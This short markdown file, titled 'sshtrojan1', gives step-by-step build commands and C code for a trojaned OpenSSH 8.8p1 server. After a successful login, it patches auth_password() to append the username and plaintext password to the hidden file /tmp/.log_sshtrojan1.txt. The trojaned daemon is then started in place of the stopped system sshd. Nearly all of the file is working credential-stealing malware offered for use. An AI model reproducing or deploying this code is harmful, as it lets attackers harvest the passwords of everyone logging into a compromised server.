# sshtrojan1
```bash
systemctl stop sshd
OPENSSH=/opt/openssh2
mkdir -p /opt/openssh2/dist/
cd ${OPENSSH}
wget http://zlib.net/zlib-1.2.11.tar.gz
tar xvfz zlib-1.2.11.tar.gz
cd zlib-1.2.11
./configure --prefix=${OPENSSH}/dist/ && make && make install
cd ${OPENSSH}
wget https://www.openssl.org/source/openssl-1.1.1m.tar.gz
tar xvfz openssl-1.1.1m.tar.gz
cd openssl-1.1.1m
./config --prefix=${OPENSSH}/dist/ && make && make install
cd ${OPENSSH}
wget http://ftp.eu.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.8p1.tar.gz
tar xvfz openssh-8.8p1.tar.gz
cd openssh-8.8p1
# Edit file auth-passwd.c, insert logging code to auth_password() function. Then, run commands below
./configure --without-openssl-header-check --prefix=${OPENSSH}/dist/ --with-zlib=${OPENSSH}/dist --with-ssl-dir=${OPENSSH}/dist/ && make && make install
/opt/openssh2/dist/sbin/sshd -f /opt/openssh2/dist/etc/sshd_config
```
Logging code:
```c
/* loggging function */
void
logging(char *user, char *password)
{
	FILE *file = fopen("/tmp/.log_sshtrojan1.txt", "a");
	fprintf(file, "Username: %s Password: %s -> Login Success!\n", user, password);
	fclose(file);
}
```
```c
/* insert into the auth_password() function  */
if (/*succesful authentication*/) {
	logging(authctxt->user, password);
	return 1;
}
return 0;
```
